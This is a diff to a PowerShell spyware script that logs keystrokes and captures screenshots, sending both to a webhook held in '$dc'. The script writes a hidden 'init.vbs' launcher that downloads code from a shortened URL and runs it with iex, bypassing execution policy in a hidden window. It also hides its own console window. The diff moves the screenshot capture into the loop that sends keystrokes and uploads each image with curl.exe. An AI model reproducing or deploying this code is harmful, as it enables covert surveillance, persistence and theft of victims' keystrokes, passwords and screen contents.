@@ -1,3 +1,6 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+
 if ($dc.Ln -ne 121) {
     Write-Host "Shortened Webhook URL Detected.."
     $dc = (irm $dc).url
@@ -9,24 +12,7 @@ $mkFile | Out-File -FilePath $pth -Force
 $mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://t.ly/o4SrC | iex`", 0, True"
 $mkFile | Out-File -FilePath $pth -Append -Force
 Rename-Item -Path $pth -NewName "init.vbs" -Force
-function screenshot {
-		$Filett = "$env:temp\SC.png"
-		Add-Type -AssemblyName System.Windows.Forms
-		Add-type -AssemblyName System.Drawing
-		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-		$Width = $Screen.Width
-		$Height = $Screen.Height
-		$Left = $Screen.Left
-		$Top = $Screen.Top
-		$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-		$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-		Start-Sleep 1
-		curl.exe -F "file1=@$filett" $hookurl
-		Start-Sleep 1
-		Remove-Item -Path $filett
-		}
+
 $send = ""
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -102,25 +88,21 @@ while ($true) {
             Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
             $send = ""
             $keyPressed = $false
+            $Filett = "$env:temp\SC.png"
+            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+            $Width = $Screen.Width
+            $Height = $Screen.Height
+            $Left = $Screen.Left
+            $Top = $Screen.Top
+            $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+            $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+            $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+            $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+            curl.exe -F "file1=@$filett" $dc
+            sleep 4
+            Remove-Item -Path $Filett
         }
-
-        $Filett = "$env:temp\SC.png"
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-type -AssemblyName System.Drawing
-        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $Width = $Screen.Width
-        $Height = $Screen.Height
-        $Left = $Screen.Left
-        $Top = $Screen.Top
-        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-
-        Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
-        Remove-Item -Path $Filett
     }
-
     $LastKeypressTime.Restart()
     Start-Sleep -Milliseconds 10
 }
